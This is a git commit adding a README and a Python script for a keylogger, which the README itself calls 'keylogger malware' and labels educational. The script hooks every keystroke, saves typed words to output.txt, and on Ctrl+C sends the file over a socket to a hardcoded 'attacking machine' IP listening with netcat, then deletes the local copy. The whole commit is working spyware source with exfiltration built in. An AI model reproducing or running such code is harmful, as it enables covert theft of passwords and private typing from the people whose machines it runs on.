ff8b792727c36a8c3f376a01488fddf85a3c7fe2
Gerard Loriz <gerardloriz@ginebro.cat>
2023-12-20 11:57:31 +0100

    keylog

--- README.md
+++ README.md
@@ -1,2 +1,29 @@
-# Python-keylogger-
-Keylogger with python
+<h1 align="center">KEylogger</h1>
+
+<p align="center">
+  <img src="https://github.com/Gerijacki.png" width="100" alt="Logo"/><br/>
+  Hi 👋, I'm <a href="https://github.com/Gerijacki">Gerijacki</a>
+</p>
+
+<p align="center">
+  <a href="https://github.com/Gerijacki/Secure-passwd/stargazers"><img src="https://img.shields.io/github/stars/Gerijacki/Secure-passwd?colorA=363a4f&colorB=b7bdf8&style=for-the-badge"></a>
+  <a href="https://github.com/Gerijacki/Secure-passwd/issues"><img src="https://img.shields.io/github/issues/Gerijacki/Secure-passwd?colorA=363a4f&colorB=f5a97f&style=for-the-badge"></a>
+  <a href="https://github.com/Gerijacki/Secure-passwd/contributors"><img src="https://img.shields.io/github/contributors/Gerijacki/Secure-passwd?colorA=363a4f&colorB=a6da95&style=for-the-badge"></a>
+</p>
+
+## Overview
+
+This is a keylogger malware devoloped with python.
+
+
+## Disclaimer
+
+Please respect copyright policies when using this tool. This project is intended for educational and personal use only. The developers are not responsible for any misuse of the software.
+
+---
+
+<p align="center">
+  <a href="https://github.com/Gerijacki">
+    <img src="https://github-readme-stats.vercel.app/api?username=Gerijacki&show_icons=true&theme=dark&count_private=true" alt="GitHub Stats" />
+  </a>
+</p>
---
+++ script.py
@@ -0,0 +1,90 @@
+import keyboard
+import sys
+import socket
+import os
+from colorama import Fore, Style
+
+# def banner_keylog():
+print("""
+888~-_        e      Y88b         / 888~~\  Y88b    / ~~~888~~~ 888~~  
+888   \      d8b      Y88b       /  888   |  Y88b  /     888    888___ 
+888    |    /Y88b      Y88b  e  /   888 _/    Y88b/      888    888    
+888   /    /  Y88b      Y88bd8b/    888  \     Y8Y       888    888    
+888_-~    /____Y88b      Y88Y8Y     888   |     Y        888    888    
+888 ~-_  /      Y88b      Y  Y      888__/     /         888    888___ 
+""")
+
+print(f'Eina feta per Gerijacki')
+
+
+
+# Colores de colorama:
+green = Fore.GREEN
+reset = Style.RESET_ALL
+
+# Cada palabra capturada se resetea en esta variable:
+palabra = ""
+
+# Función para registrar cada palabra presionada en la variable palabra:
+def on_key_event(e):
+
+    global palabra
+
+    if e.event_type == keyboard.KEY_DOWN:
+    
+        if e.name == 'space':
+            guardar_palabra()
+        elif len(e.name) == 1 and e.name.isprintable():
+            palabra += e.name
+
+# Cada palabra se guarda en el output.txt y se crea en caso de no existir.
+def guardar_palabra():
+    if not os.path.exists("output.txt"):
+        # Si el archivo no existe, se crea con permisos de escritura.
+        with open("output.txt", "w"):
+            pass
+
+    with open("output.txt", "a") as file:
+        file.write(palabra + "\n")
+    print(f'Palabra registrada: {Fore.GREEN}{palabra}{Style.RESET_ALL}')
+    resetear_palabra() # Llamamos a la función que se encarga de resetear la variable después de presionar espacio.
+
+# Función para que se vaya registrando en la variable cada palabra al presionar espacio.
+def resetear_palabra():
+    global palabra
+    palabra = ""
+
+# Enviamos el output.txt a una máquina atacante que esté escuchando con netcat (después de presionar control + C).
+def enviar_archivo_via_sockets(archivo, direccion_ip, puerto):
+    try:
+        with open(archivo, 'rb') as file:
+            contenido = file.read()
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((direccion_ip, puerto))
+            s.sendall(contenido)
+            os.remove("output.txt")
+            sys.exit()
+
+    except Exception as e:
+        print(f"Error al enviar el archivo: {e}")
+
+# Se detiene el script y ahí se llama a la función anterior.
+def detener_script():
+    print("Script detenido por el usuario.")
+    keyboard.unhook_all()  # Desvincular todos los eventos de teclado
+    enviar_archivo_via_sockets(archivo_a_enviar, direccion_ip_destino, puerto_destino)
+
+# Donde enviamos el .txt
+direccion_ip_destino = '192.168.56.111'
+puerto_destino = 8080
+archivo_a_enviar = 'output.txt'
+
+# Registrar la función de devolución de llamada
+keyboard.hook(on_key_event)
+
+try:
+    keyboard.wait('esc')
+except KeyboardInterrupt:
+    # Manejar la excepción cuando se presiona Ctrl+C fuera del bucle
+    detener_script()
